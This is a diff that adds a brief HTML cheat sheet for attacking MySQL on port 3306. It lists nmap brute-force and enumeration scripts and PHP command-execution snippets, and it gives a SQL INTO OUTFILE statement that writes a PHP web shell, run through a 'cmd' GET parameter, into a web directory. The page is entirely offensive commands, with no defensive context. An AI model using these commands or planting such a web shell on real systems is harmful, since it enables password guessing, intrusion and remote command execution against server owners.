@@ -1,0 +1,14 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>MYSQL - 3306</title>
+</head><body><b>Tool:</b><br/>
+nmap -p 3306 --script mysql-brute IP <br/>
+nmap -script=mysql-info,mysql-enum,mysql-users,mysql-empty-password,mysql-variables 192.168.200.72<br/>
+<br/>
+<br/>
+<b>RCE</b>:<br/>
+&lt;?php system("ls")?&gt;<br/>
+&lt;?php phpinfo()?&gt;<br/>
+SELECT "&lt;?php system($_GET['cmd']); ?&gt;" into outfile "/var/www/db/ciao.php"</body></html>
